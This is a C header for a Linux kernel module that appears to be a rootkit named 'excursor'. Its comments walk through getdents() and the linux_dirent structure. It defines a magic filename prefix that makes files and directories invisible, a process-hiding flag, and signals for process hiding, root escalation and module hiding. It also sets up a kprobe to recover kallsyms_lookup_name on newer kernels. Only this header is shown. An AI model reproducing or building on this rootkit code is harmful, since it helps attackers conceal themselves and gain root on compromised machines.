/* Header and helper file for the actual module.
getdents()
       The system call getdents() reads several linux_dirent structures
       from the directory referred to by the open file descriptor fd
       into the buffer pointed to by dirp.  The argument count specifies
       the size of that buffer.*/

       //The linux_dirent structure is declared as follows:

          /* struct linux_dirent {
               unsigned long  d_inode;     Inode number
               unsigned long  d_offset;     Offset to next linux_dirent
               unsigned short d_reclen;  Length of this linux_dirent
               char           d_name[];  /Filename (null-terminated)
                                 	length is actually (d_reclen - 2 -
                                    offsetof(struct linux_dirent, d_name))
               
               char           pad;       	Zero padding byte
               char           d_type;    	File type (only since Linux 2.6.4); offset is 							(d_reclen - 1)
               
           }

       d_ino is an inode number.  d_off is the distance from the start
       of the directory to the start of the next linux_dirent.  d_reclen
       is the size of this entire linux_dirent.  d_name is a null-
       terminated filename.*/
struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

#define MAGIC_PREFIX "himitsu_ex" //the magic prefix which when rename to a file or directory, 						will be invisible

#define PF_INVISIBLE 0x10000000

#define MODULE_NAME "excursor"

enum {
	SIGINVIS = 31,
	SIGSUPER = 64,
	SIGMODINVIS = 63,
};

#ifndef IS_ENABLED
#define IS_ENABLED(option) \
(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
	    .symbol_name = "kallsyms_lookup_name"
};
#endif


